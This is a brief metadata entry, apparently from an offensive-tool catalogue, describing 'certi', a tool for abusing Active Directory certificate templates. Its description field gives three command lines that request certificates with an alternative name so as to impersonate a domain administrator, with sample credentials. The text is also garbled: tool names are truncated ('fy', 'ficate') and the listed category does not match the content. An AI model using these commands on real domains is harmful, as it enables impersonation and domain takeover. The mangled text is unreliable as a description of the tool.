---
title: "Certi"
description: "Use fy,  or py to request a ficate and add an alternative name (user to impersonate)
# request certificates for the machine account by executing fy with the \"/machine\" argument from an elevated command prompt.
fy.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:domadmin
certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
"
url: "https://github.com/eloypgz/certi"
category: "Password Cracking"
---
